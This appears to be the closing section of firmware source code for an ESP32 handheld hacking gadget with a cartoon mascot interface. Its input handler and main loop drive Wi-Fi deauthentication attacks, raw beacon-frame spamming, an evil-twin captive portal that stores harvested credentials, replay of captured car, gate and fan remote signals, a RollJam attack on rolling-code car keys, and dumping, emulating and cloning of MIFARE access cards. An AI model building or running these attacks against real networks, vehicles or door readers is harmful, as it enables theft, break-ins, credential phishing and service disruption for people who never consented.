    saveWifiDeauthSession();
  }
  etActive=false; webServer.stop(); dnsServer.stop();
  WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
  Serial.printf("[PORTAL] Stopped. Demo submissions: %d\n",etCredCount);
  currentState=STATE_WIFI_MENU;
}

// ============================================================
// INPUT HANDLING
// ============================================================

void handleInput(char input) {
  DBG_PRINTF("[INPUT] state=%d key=%c menu=%d\n", currentState, input, menuIndex);
  switch (currentState) {
    case STATE_MENU:
      if(input=='w'&&menuIndex>0) menuIndex--;
      else if(input=='s'&&menuIndex<menuCount-1) menuIndex++;
      else if(input=='e') {
        switch(menuIndex) {
          case 0: currentState=STATE_WIFI_MENU; wifiMenuIndex=0; wifiMenuScroll=0; triggerReaction(MOOD_THINKING, "Wi-Fi", "choose tool"); break;
          case 1: currentState=STATE_SUBGHZ; startSubGhz(); return;
          case 2: currentState=STATE_NFC_MENU; nfcMenuIdx=0; triggerReaction(MOOD_THINKING, "NFC", "choose mode"); break;
          case 3: currentState=STATE_IR; triggerReaction(MOOD_THINKING, "IR Remote", "planned"); break;
          case 4: currentState=STATE_ABOUT; triggerReaction(MOOD_HAPPY, "Mascot", FW_VERSION); break;
        }
      }
      break;
    case STATE_WIFI_MENU:
      if(input=='w'&&wifiMenuIndex>0) {
        wifiMenuIndex--;
        if (wifiMenuIndex < wifiMenuScroll) wifiMenuScroll = wifiMenuIndex;
      }
      else if(input=='s'&&wifiMenuIndex<wifiMenuCount-1) {
        wifiMenuIndex++;
        if (wifiMenuIndex >= wifiMenuScroll + 5) wifiMenuScroll = wifiMenuIndex - 4;
      }
      else if(input=='e') {
        switch(wifiMenuIndex) {
          case 0: runWifiScan(); return;
          case 1: startPacketMonitor(); return;
          case 2: startProbeSniffer(); return;
          case 3: startDeauthDetector(); return;
          case 4: enterDeauthTargetSelect(); return;
          case 5: startBeaconSpam(); return;
          case 6: enterEvilTwinTarget(); return;
          case 7: currentState=STATE_PORTAL_THEME; triggerReaction(MOOD_THINKING, "Portal Theme", "choose look"); break;
        }
      }
      else if(input=='q') currentState=STATE_MENU;
      break;
    case STATE_WIFI_RESULTS:
      if(input=='w'&&wifiScroll>0) wifiScroll--;
      else if(input=='s'&&wifiScroll<wifiCount-4) wifiScroll++;
      else if(input=='q') currentState=STATE_WIFI_MENU;
      break;
    case STATE_PACKET_MONITOR:
      if(input=='q') stopPacketMonitor(); break;
    case STATE_PROBE_SNIFF:
      if(input=='w'&&probeScroll>0) probeScroll--;
      else if(input=='s'&&probeScroll<probeCount-4) probeScroll++;
      else if(input=='q') stopProbeSniffer();
      break;
    case STATE_DEAUTH_DETECT:
      if(input=='e') { stopDeauthDetector(); enterDeauthTargetSelect(); }
      else if(input=='q') stopDeauthDetector();
      break;
    case STATE_DEAUTH_TARGET:
      if(input=='w'&&deauthTargetIdx>0) { deauthTargetIdx--; if(deauthTargetIdx<deauthTargetScroll) deauthTargetScroll=deauthTargetIdx; }
      else if(input=='s'&&deauthTargetIdx<wifiCount-1) { deauthTargetIdx++; if(deauthTargetIdx>=deauthTargetScroll+4) deauthTargetScroll=deauthTargetIdx-3; }
      else if(input=='e') startClientScan();
      else if(input=='q') currentState=STATE_WIFI_MENU;
      break;
    case STATE_DEAUTH_CLIENT_SCAN:
      if(input=='q') finishClientScan(); break;
    case STATE_DEAUTH_CLIENT_SELECT: {
      int totalRows=clientCount+2;
      if(input=='w'&&clientSelectIdx>0) { clientSelectIdx--; if(clientSelectIdx<clientSelectScroll) clientSelectScroll=clientSelectIdx; }
      else if(input=='s'&&clientSelectIdx<totalRows-1) { clientSelectIdx++; if(clientSelectIdx>=clientSelectScroll+4) clientSelectScroll=clientSelectIdx-3; }
      else if(input=='e') prepareDeauthAttackConfirm();
      else if(input=='q') currentState=STATE_WIFI_MENU;
      break;
    }
    case STATE_DEAUTH_CONFIRM:
      if(input=='q') { deauthConfirmHoldStart = 0; currentState=STATE_DEAUTH_CLIENT_SELECT; }
      break;
    case STATE_DEAUTH_ATTACK:
      if(input=='q') stopDeauthAttack(); break;
    case STATE_BEACON_SPAM:
      if(input=='q') stopBeaconSpam(); break;
    case STATE_ET_TARGET:
      if(input=='w'&&etTargetIdx>0) { etTargetIdx--; if(etTargetIdx<etTargetScroll) etTargetScroll=etTargetIdx; }
      else if(input=='s'&&etTargetIdx<wifiCount-1) { etTargetIdx++; if(etTargetIdx>=etTargetScroll+4) etTargetScroll=etTargetIdx-3; }
      else if(input=='e') startEvilTwin();
      else if(input=='q') currentState=STATE_WIFI_MENU;
      break;
    case STATE_ET_RUNNING:
      if(input=='e') enterPortalDeauthFlow();
      else if(input=='q') stopEvilTwin();
      break;
    case STATE_PORTAL_THEME:
      if(input=='w'&&portalThemeIdx>0) {
        portalThemeIdx--;
        if (portalThemeIdx < portalThemeScroll) portalThemeScroll = portalThemeIdx;
      }
      else if(input=='s'&&portalThemeIdx<portalThemeTotal()-1) {
        portalThemeIdx++;
        if (portalThemeIdx >= portalThemeScroll + 4) portalThemeScroll = portalThemeIdx - 3;
      }
      else if(input=='e') {
        Serial.printf("[PORTAL] theme=%s\n", portalThemeName(portalThemeIdx));
        triggerReaction(MOOD_SUCCESS, "Theme set", portalThemeName(portalThemeIdx));
        currentState=STATE_WIFI_MENU;
      }
      else if(input=='q') currentState=STATE_WIFI_MENU;
      break;
    case STATE_SUBGHZ:
      if(input=='q') { stopSubGhz(); currentState=STATE_MENU; }
      else if(input=='0') setSubGhzTargetClass("unknown");
      else if(input=='1') setSubGhzTargetClass("fixed_code_car");
      else if(input=='2') setSubGhzTargetClass("fixed_code_gate");
      else if(input=='5') setSubGhzTargetClass("fixed_code_fan");
      else if(input=='8') setSubGhzTargetClass("fixed_code_appliance");
      else if(input=='6') {
        // Quick-set 315 MHz — most Chinese ceiling fans use 315 MHz, not 433.92
        sgActiveFreqMHz = 315.0f;
        sgFreqScanIdx = 2;
        configureSubGhzRawRx(315.0f, false);
        setSubGhzTargetClass("fixed_code_fan");
        Serial.println("[CC1101] freq=315.00MHz set (Chinese fan band). Arm capture with DOWN or 'e'.");
        triggerReaction(MOOD_THINKING, "315MHz", "fan band");
      }
      else if(input=='7') {
        // Quick-set 433.92 MHz (default)
        sgActiveFreqMHz = 433.92f;
        sgFreqScanIdx = 6;
        configureSubGhzRawRx(433.92f, false);
        Serial.println("[CC1101] freq=433.92MHz set (default).");
        triggerReaction(MOOD_THINKING, "433MHz", "default");
      }
      else if(input=='3') {
        setSubGhzTargetClass("rolling_code_car_attempt");
        sgPairId = millis();
        sgCaptureIndex = 1;
        sgNeedSecondCapture = true;
        armSubGhzCapture("press 1");
      }
      else if(input=='4') {
        // 4-press session: captures 4 consecutive presses with same pair_id
        // All 4 files saved to SD — study which edges change (rolling counter)
        // vs stay fixed (device serial / preamble) across all 4 captures
        setSubGhzTargetClass("rolling_code_car_attempt");
        sgPairId      = millis();
        sgCaptureIndex = 0;
        sgNeedSecondCapture = false;
        sgSessionTarget = SG_SESSION_MAX;
        sgSessionCount  = 0;
        Serial.printf("[CC1101] 4-press session started pair_id=%lu; press fob %d times\n",
                      sgPairId, SG_SESSION_MAX);
        armSubGhzCapture("press 1");
      }
      else if(input=='x') runRollingCodeSimulator();
      else if(sgAwaitReplayResult && input=='w') {
        sgAwaitReplayResult=false;
        Serial.printf("[CC1101] replay result=accepted target_class=%s observation=opened_or_triggered\n", sgTargetClass);
        saveSubGhzReplayResult("accepted", "opened_or_triggered");
        triggerReaction(MOOD_SUCCESS, "Replay worked", sgTargetClass);
      }
      else if(sgAwaitReplayResult && input=='i') {
        sgAwaitReplayResult=false;
        Serial.printf("[CC1101] replay result=partial target_class=%s observation=interaction_no_unlock note=modern_vehicle_response_possible_but_replay_not_accepted\n", sgTargetClass);
        saveSubGhzReplayResult("partial", "interaction_no_unlock");
        triggerReaction(MOOD_THINKING, "Interaction", "no unlock");
      }
      // UP button (w) when capture ready and not awaiting result → direct replay
      // Same as serial 'r': skip press-2 comparison, replay immediately.
      // Useful for field testing without a laptop.
      else if(!sgAwaitReplayResult && sgCapture.valid && input=='w') {
        sgNeedSecondCapture = false;
        Serial.println("[CC1101] BTN UP: replay direct (field mode)");
        replaySubGhzCapture();
      }
      // UP button (w) when no capture yet → start 2-press classify mode.
      // Capture press 1, then press 2, then shows FIXED or ROLLING? verdict.
      // Fan/gate = fixed (>85% sim), car key = rolling (<50% sim).
      else if(!sgCapture.valid && !sgArmed && input=='w') {
        setSubGhzTargetClass("code_type_check");
        sgPairId = millis();
        sgCaptureIndex = 1;
        sgNeedSecondCapture = true;
        Serial.println("[CC1101] Classify mode: press remote TWICE → FIXED or ROLLING? verdict");
        Serial.println("[CC1101] Tip: if last replay failed, use freq scanner (serial f) first to confirm frequency");
        armSubGhzCapture("press 1");
      }
      else if(input=='r' && sgCapture.valid) {
        // Replay press-1 immediately without capturing press 2.
        // Use case: car was out of range when fob was pressed, so code was
        // not consumed; operator moves into range and replays to test if
        // receiver accepts the uncounsumed token.
        sgNeedSecondCapture = false;
        Serial.println("[CC1101] replay press-1 direct (skipping press-2 comparison)");
        replaySubGhzCapture();
      }
      else if(input=='e') {
        if (sgCapture.valid && sgNeedSecondCapture) {
          sgNeedSecondCapture = false;
          armSubGhzCapture("press 2");
        }
        else if (sgCapture.valid) replaySubGhzCapture();
        else armSubGhzCapture("press remote");
      }
      else if(input=='j') {
        // RollJam — two-CC1101 attack (spare CC1101 on CS=GPIO2 required)
        startRollJam();
      }
      else if(input=='f') {
        runFreqScan();
        currentState = STATE_SUBGHZ_FREQSCAN;
      }
      else if(input=='u') {
        runBwTune();
      }
      else if(input=='s') {
        if (sgAwaitReplayResult) {
          sgAwaitReplayResult=false;
          Serial.printf("[CC1101] replay result=rejected target_class=%s reason=no_physical_response\n", sgTargetClass);
          saveSubGhzReplayResult("rejected", "no_physical_response");
          triggerReaction(MOOD_FAIL, "Replay rejected", "no response");
        }
        else if (sgArmed) {
          // cancel pending arm
          sgArmed = false;
          sgListening = true;
          configureSubGhzRawRx(sgActiveFreqMHz, false);
          Serial.println("[CC1101] arm cancelled");
          triggerReaction(MOOD_SAD, "Arm cancelled", "");
        }
        else if (sgCapture.valid) {
          sgCapture.valid=false; sgWaveReady=false; sgLoadedFromSd=false;
          sgNeedSecondCapture=false;
          snprintf(sgTargetClass, sizeof(sgTargetClass), "unknown");
          Serial.println("[CC1101] capture cleared");
          triggerReaction(MOOD_IDLE, "Cleared", "");
        }
        else {
          // No capture, not armed → arm now (DOWN = quick arm for field use)
          armSubGhzCapture("press remote");
        }
      }
      break;
    case STATE_SUBGHZ_FREQSCAN:
      if(input=='w' && sgFreqScanIdx > 0) sgFreqScanIdx--;
      else if(input=='s' && sgFreqScanIdx < SG_SCAN_NFREQS - 1) sgFreqScanIdx++;
      else if(input=='e') {
        setActiveFreq(sgFreqScanIdx);
        currentState = STATE_SUBGHZ;
      }
      else if(input=='q') currentState = STATE_SUBGHZ;
      break;
    case STATE_SUBGHZ_ROLLJAM:
      if(input=='e' && sgRJPhase == RJ_COMPLETE) {
        // Replay held P2 code
        Serial.println("[RollJam] replaying P2 — second unlock");
        replaySubGhzCapture();
      }
      else if(input=='q') {
        stopJammer();
        sgRJPhase = RJ_IDLE;
        currentState = STATE_SUBGHZ;
        Serial.println("[RollJam] aborted");
        triggerReaction(MOOD_SAD, "RollJam", "aborted");
      }
      break;
    case STATE_SUBGHZ_PICKER:
      if(input=='w' && sgPickerIdx > 0) {
        sgPickerIdx--;
        if (sgPickerIdx < sgPickerScroll) sgPickerScroll = sgPickerIdx;
      }
      else if(input=='s' && sgPickerIdx < sgPickerCount - 1) {
        sgPickerIdx++;
        if (sgPickerIdx >= sgPickerScroll + 4) sgPickerScroll = sgPickerIdx - 3;
      }
      else if(input=='e') {
        if (sgPickerIdx >= 0 && sgPickerIdx < sgPickerCount && loadSubGhzCaptureFile(sgPickerPaths[sgPickerIdx])) {
          Serial.printf("[CC1101] picker selected %s\n", sgPickerPaths[sgPickerIdx]);
          currentState = STATE_SUBGHZ;
        }
      }
      else if(input=='q') currentState = STATE_SUBGHZ;
      break;
    case STATE_NFC:
      if(input=='q') { nfcCard.valid=false; currentState=STATE_NFC_MENU; }
      else if(input=='e') nfcCard.valid=false;
      break;

    case STATE_NFC_MENU:
      if (input=='w' && nfcMenuIdx>0) nfcMenuIdx--;
      else if (input=='s' && nfcMenuIdx<2) nfcMenuIdx++;
      else if (input=='e') {
        if (nfcMenuIdx==0) {
          nfcCard.valid=false;
          currentState=STATE_NFC;
          triggerReaction(MOOD_THINKING, "Bank Card", "hold card");
        } else if (nfcMenuIdx==1) {
          memset(&mifareCard, 0, sizeof(mifareCard));
          mifareReady=false; nfcAccessPhase=NFC_ACC_SCANNING;
          nfcEmulateGotHit=false; nfcAccessLastScan=0;
          snprintf(mifareStatus, sizeof(mifareStatus), "Hold card...");
          currentState=STATE_NFC_ACCESS;
          triggerReaction(MOOD_THINKING, "Access Card", "hold card");
        } else {
          nfcLoadSavedList();
          nfcSavedIdx=0; nfcSavedScroll=0;
          currentState=STATE_NFC_SAVED;
        }
      }
      else if (input=='q') currentState=STATE_MENU;
      break;

    case STATE_NFC_ACCESS:
      switch (nfcAccessPhase) {
        case NFC_ACC_SCANNING:
          if (input=='q') { currentState=STATE_NFC_MENU; }
          break;
        case NFC_ACC_READY:
          if (input=='e') { // emulate
            nfcEmulateGotHit=false; nfcEmulateLastTry=0;
            nfcAccessPhase=NFC_ACC_EMULATING;
            triggerReaction(MOOD_WORKING, "Emulating", mifareCard.uid);
          } else if (input=='w') { // save
            nfcSaveMifare(mifareCard);
          } else if (input=='s') { // write to magic card
            snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Present blank card");
            nfcAccessPhase=NFC_ACC_WRITE_CONFIRM;
          } else if (input=='q') {
            currentState=STATE_NFC_MENU;
          }
          break;
        case NFC_ACC_EMULATING:
          if (input=='e') { // switch to write
            snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Present blank card");
            nfcAccessPhase=NFC_ACC_WRITE_CONFIRM;
          } else if (input=='q') {
            nfcAccessPhase=NFC_ACC_READY;
          }
          break;
        case NFC_ACC_WRITE_CONFIRM:
          if (input=='e') { nfcAccessPhase=NFC_ACC_WRITING; }
          else if (input=='q') { nfcAccessPhase=NFC_ACC_EMULATING; }
          break;
        case NFC_ACC_WRITE_DONE: case NFC_ACC_WRITE_FAIL:
          if (input=='q') { nfcAccessPhase=NFC_ACC_READY; }
          break;
        default: break;
      }
      break;

    case STATE_NFC_SAVED:
      if (input=='w' && nfcSavedIdx>0) {
        nfcSavedIdx--;
        if (nfcSavedIdx < nfcSavedScroll) nfcSavedScroll=nfcSavedIdx;
      } else if (input=='s' && nfcSavedIdx<nfcSavedCount-1) {
        nfcSavedIdx++;
        if (nfcSavedIdx >= nfcSavedScroll+4) nfcSavedScroll=nfcSavedIdx-3;
      } else if (input=='e' && nfcSavedCount>0) {
        // Load binary sidecar → go to access/emulate flow
        if (nfcLoadMifare(nfcSavedPaths[nfcSavedIdx], mifareCard)) {
          mifareReady=true;
          nfcEmulateGotHit=false; nfcEmulateLastTry=0;
          nfcAccessPhase=NFC_ACC_EMULATING;
          currentState=STATE_NFC_ACCESS;
          triggerReaction(MOOD_WORKING, "Emulating", mifareCard.uid);
        }
      } else if (input=='q') currentState=STATE_NFC_MENU;
      break;

    case STATE_IR: case STATE_ABOUT:
      if(input=='q') currentState=STATE_MENU; break;
    default: break;
  }
}

// ============================================================
// SETUP + LOOP
// ============================================================

void setup() {
  Serial.begin(115200);
  Serial.printf("VariOne %s booting...\n", FW_VERSION);
  Serial.printf("[BOOT] chip=%s rev=%d cores=%d cpu=%dMHz sdk=%s\n",
                ESP.getChipModel(), ESP.getChipRevision(), ESP.getChipCores(),
                ESP.getCpuFreqMHz(), ESP.getSdkVersion());
  Serial.printf("[BOOT] pins OLED/PN532 SDA=21 SCL=22 | CC1101 CS=15 SCK=18 MISO=19 MOSI=23 GDO0=4 | SD CS=5 SCK=27 MISO=16 MOSI=17 | buttons L/U/R/D=14/26/32/33\n");
  Serial.printf("[BOOT] debug serial=%s\n", DEBUG_SERIAL ? "on" : "off");
  esp_log_level_set("wifi", ESP_LOG_NONE);
  Wire.begin(21, 22);
  display.begin();
  display.clearBuffer();
  mascotVisualAllowed = true;
  drawMascot(22, 28, MOOD_WORKING);
  mascotVisualAllowed = false;
  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(46, 28, "Booting");
  display.drawStr(46, 42, FW_VERSION);
  display.sendBuffer();
  logHeap("boot display");
  pinMode(PIN_CC_CS, OUTPUT);
  digitalWrite(PIN_CC_CS, HIGH);
  initCC1101();
  initCC1101Jammer();  // spare CC1101 on CS=GPIO2 (no-op if not wired)
  initNFC();
  initSD();
  initButtons();
  drawBootAnimation();   // mascot walks in + waves
  lastInputTime = millis();
  currentState = STATE_MENU;
}

void loop() {

  // === REACTION SCREEN (overrides everything for REACTION_MS) ===
  if (reactionActive) {
    if (millis() - reactionStart < REACTION_MS) {
      drawReactionScreen();
      char input = 0;
      if (Serial.available()) { char c=Serial.read(); if(c=='r') sdPrintAllCreds(); else input=c; }
      if (!input) input = readButtons();
      if (input) { lastInputTime=millis(); reactionActive=false; handleInput(input); }
      delay(30);
      return;
    } else {
      reactionActive = false;
    }
  }

  // === IDLE SLEEP (30s no input on menu) ===
  if (currentState == STATE_MENU && millis() - lastInputTime > SLEEP_TIMEOUT) {
    static unsigned long lastSleepDraw = 0;
    if (millis() - lastSleepDraw > 100) {
      display.clearBuffer();
      mascotVisualAllowed = true;
      drawMascot(50, 30, MOOD_SLEEPING);
      mascotVisualAllowed = false;
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(10, 8,  "z");
      display.drawStr(18, 5,  "z");
      display.drawStr(26, 2,  "Z");
      display.sendBuffer();
      lastSleepDraw = millis();
    }
    char input = 0;
    if (Serial.available()) input = Serial.read();
    if (!input) input = readButtons();
    if (input) { lastInputTime = millis(); handleInput(input); }
    delay(30);
    return;
  }

  // === BACKGROUND TASKS ===

  if (etActive && currentState != STATE_ET_RUNNING) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }

  if (currentState==STATE_PACKET_MONITOR && monitorActive) {
    if (millis()-lastChannelHop>200) { if(++currentChannel>14) currentChannel=1; esp_wifi_set_channel(currentChannel,WIFI_SECOND_CHAN_NONE); lastChannelHop=millis(); }
    if (millis()-lastMonitorDraw>100) { drawPacketMonitor(); lastMonitorDraw=millis(); }
  }

  if (currentState==STATE_PROBE_SNIFF && probeActive) {
    static unsigned long lastProbeHop=0;
    if (millis()-lastProbeHop>500) { static int probeCh=1; if(++probeCh>14) probeCh=1; esp_wifi_set_channel(probeCh,WIFI_SECOND_CHAN_NONE); lastProbeHop=millis(); }
  }

  if (currentState==STATE_DEAUTH_DETECT && deauthActive) {
    static unsigned long lastDetectHop=0;
    if (millis()-lastDetectHop>300) { static int detectCh=1; if(++detectCh>14) detectCh=1; esp_wifi_set_channel(detectCh,WIFI_SECOND_CHAN_NONE); lastDetectHop=millis(); }
  }

  if (currentState==STATE_DEAUTH_CLIENT_SCAN && clientScanActive)
    if (millis()-clientScanStart>=CLIENT_SCAN_MS) finishClientScan();

  if (currentState==STATE_DEAUTH_CONFIRM) {
    if (digitalRead(BTN_RIGHT) == LOW) {
      if (deauthConfirmHoldStart == 0) deauthConfirmHoldStart = millis();
      if (millis() - deauthConfirmHoldStart >= DEAUTH_CONFIRM_HOLD_MS) {
        deauthConfirmHoldStart = 0;
        startDeauthAttack();
        return;
      }
    } else {
      deauthConfirmHoldStart = 0;
    }
  }

  if (currentState==STATE_DEAUTH_ATTACK) {
    if (deauthAttackActive && millis() - deauthAttackStart >= DEAUTH_ATTACK_MS) {
      Serial.println("[DEAUTH] auto-stop after 60s demo window");
      stopDeauthAttack();
      triggerReaction(MOOD_SUCCESS, "Deauth done", "60s window");
      return;
    }
    if (!deauthAttackActive && deauthTaskHandle == nullptr) {
      // task exited on its own (e.g. no clients in ALL_DISCOVERED)
      triggerReaction(MOOD_FAIL, "No clients", "halted");
      stopDeauthAttack();
      return;
    }
    if (millis()-lastDeauthSend>=500) {
      // draw update every 500ms — Core 1 handles actual TX
      if (deauthFrameCount % 60 == 0 && deauthFrameCount > 0) {
        Serial.printf("[DEAUTH] progress ok=%d fail=%d mode=%s\n",
                      deauthTxOk, deauthTxFail, deauthModeName(attackMode));
      }
      lastDeauthSend=millis(); drawDeauthAttack();
    }
  }

  if (currentState==STATE_BEACON_SPAM && beaconSpamActive) {
    if (millis()-lastBeaconSend>=10) {
      uint8_t ch=beaconChannels[beaconChannelIdx];
      uint8_t ssidLen=strlen(spamSSIDs[beaconSSIDIdx]);
      uint8_t frame[100]; int p=0;
      frame[p++]=0x80; frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00;
      frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF;
      memcpy(&frame[p],spamMACs[beaconSSIDIdx],6); p+=6;
      memcpy(&frame[p],spamMACs[beaconSSIDIdx],6); p+=6;
      frame[p++]=0x00; frame[p++]=0x00;
      memset(&frame[p],0,8); p+=8;
      frame[p++]=0x64; frame[p++]=0x00; frame[p++]=0x31; frame[p++]=0x04;
      frame[p++]=0x00; frame[p++]=ssidLen;
      memcpy(&frame[p],spamSSIDs[beaconSSIDIdx],ssidLen); p+=ssidLen;
      frame[p++]=0x01; frame[p++]=0x08;
      frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
      frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;
      frame[p++]=0x03; frame[p++]=0x01; frame[p++]=ch;
      esp_err_t r=esp_wifi_80211_tx(WIFI_IF_AP,frame,p,false);
      beaconFrameCount++; lastBeaconSend=millis();
      if(beaconFrameCount%20==0) Serial.printf("[BEACON] ssid=\"%s\" ch=%d total=%d tx=%s\n",spamSSIDs[beaconSSIDIdx],ch,beaconFrameCount,r==ESP_OK?"OK":"FAIL");
      beaconSSIDIdx++;
      if(beaconSSIDIdx>=spamSSIDCount) {
        beaconSSIDIdx=0;
        beaconChannelIdx=(beaconChannelIdx+1)%3;
        esp_wifi_set_channel(beaconChannels[beaconChannelIdx],WIFI_SECOND_CHAN_NONE);
        drawBeaconSpam();
      }
    }
  }

  if (currentState==STATE_ET_RUNNING && etActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
    if (millis()-lastEtDraw>2000) { drawEvilTwinRunning(); lastEtDraw=millis(); }
  }

  if (currentState == STATE_NFC && nfcReady && !nfcCard.valid && millis() - nfcLastScan > 800) {
    Wire.beginTransmission(0x24);
    if (Wire.endTransmission() == 0) nfcReadCard();
    nfcLastScan = millis();
  }

  // Mifare access card — scan phase
  if (currentState == STATE_NFC_ACCESS && nfcReady &&
      nfcAccessPhase == NFC_ACC_SCANNING && millis() - nfcAccessLastScan > 1200) {
    if (nfcReadMifare(mifareCard)) {
      mifareReady = true;
      nfcAccessPhase = NFC_ACC_READY;
      if (mifareCard.sectorsRead > 0)
        triggerReaction(MOOD_SUCCESS, "Dumped", mifareStatus);
      else
        triggerReaction(MOOD_HAPPY, "Card UID", mifareCard.uid);
    }
    nfcAccessLastScan = millis();
  }

  // Mifare emulation — call TgInitAsTarget with 300 ms timeout each tick
  if (currentState == STATE_NFC_ACCESS && nfcReady &&
      nfcAccessPhase == NFC_ACC_EMULATING && !nfcEmulateGotHit &&
      millis() - nfcEmulateLastTry > 350) {
    if (nfcEmulateStep(mifareCard)) {
      nfcEmulateGotHit = true;
      triggerReaction(MOOD_SUCCESS, "Reader hit!", mifareCard.uid);
    }
    nfcEmulateLastTry = millis();
  }

  // Mifare write to magic card
  if (currentState == STATE_NFC_ACCESS && nfcAccessPhase == NFC_ACC_WRITING) {
    if (nfcWriteToMagicCard(mifareCard)) {
      nfcAccessPhase = NFC_ACC_WRITE_DONE;
      triggerReaction(MOOD_SUCCESS, "Written!", nfcWriteStatus);
    } else {
      nfcAccessPhase = NFC_ACC_WRITE_FAIL;
      triggerReaction(MOOD_FAIL, "Write fail", nfcWriteStatus);
    }
  }

  if (currentState==STATE_SUBGHZ && sgListening && cc1101Ok && sgArmed) {
    uint8_t gdoNow = digitalRead(4);
    int rssiNow = ELECHOUSE_cc1101.getRssi();
    bool edgeSeen = gdoNow != sgArmLastGdo;
    bool rssiSeen = rssiNow > sgNoiseFloor + 8 && rssiNow > -82;
    if (millis() - sgArmTime > SG_ARM_WINDOW) {
      sgArmed = false;
      triggerReaction(MOOD_SAD, "No signal", "try again");
      Serial.printf("[CC1101] armed capture timeout; no trigger edge/rssi seen last_gdo=%u now_gdo=%u rssi=%d floor=%d\n",
                    sgArmLastGdo, gdoNow, rssiNow, sgNoiseFloor);
    } else if (millis() - sgArmTime > 50 && (edgeSeen || rssiSeen)) {
      Serial.printf("[CC1101] capture trigger edge=%s rssi=%s gdo=%u->%u rssi=%d floor=%d\n",
                    edgeSeen ? "yes" : "no", rssiSeen ? "yes" : "no",
                    sgArmLastGdo, gdoNow, rssiNow, sgNoiseFloor);
      captureRawSignal();
      sgArmed = false;
    } else {
      sgArmLastGdo = gdoNow;
    }
  }

  // === NORMAL SCREEN DRAW ===
  if (currentState!=STATE_PACKET_MONITOR &&
      currentState!=STATE_DEAUTH_ATTACK  &&
      currentState!=STATE_BEACON_SPAM    &&
      currentState!=STATE_ET_RUNNING) {
    switch (currentState) {
      case STATE_MENU:                 drawMenu(); break;
      case STATE_WIFI_MENU:            drawWifiMenu(); break;
      case STATE_WIFI_RESULTS:         drawWifiResults(); break;
      case STATE_PROBE_SNIFF:          drawProbeSniffer(); break;
      case STATE_DEAUTH_DETECT:        drawDeauthDetector(); break;
      case STATE_DEAUTH_TARGET:        drawDeauthTargetSelect(); break;
      case STATE_DEAUTH_CLIENT_SCAN:   drawClientScan(); break;
      case STATE_DEAUTH_CLIENT_SELECT: drawClientSelect(); break;
      case STATE_DEAUTH_CONFIRM:       drawDeauthConfirm(); break;
      case STATE_ET_TARGET:            drawEvilTwinTarget(); break;
      case STATE_PORTAL_THEME:         drawPortalTheme(); break;
      case STATE_SUBGHZ:        drawSubGhz(); break;
      case STATE_SUBGHZ_PICKER: drawSubGhzPicker(); break;
      case STATE_SUBGHZ_FREQSCAN: drawSubGhzFreqScan(); break;
      case STATE_SUBGHZ_ROLLJAM:  drawSubGhzRollJam(); break;
      case STATE_NFC:          drawNFC(); break;
      case STATE_NFC_MENU:     drawNfcMenu(); break;
      case STATE_NFC_ACCESS:   drawNfcAccess(); break;
      case STATE_NFC_SAVED:    drawNfcSaved(); break;
      case STATE_IR:      drawPlaceholder("IR Remote",  "Coming soon..."); break;
      case STATE_ABOUT:   drawAbout(); break;
      default: break;
    }
  }

  // === INPUT ===
  char input = 0;
  if (Serial.available()) { char c=Serial.read(); if(c=='r') sdPrintAllCreds(); else input=c; }
  if (!input) input = readButtons();
  if (input) { lastInputTime=millis(); handleInput(input); }

  delay(30);
}
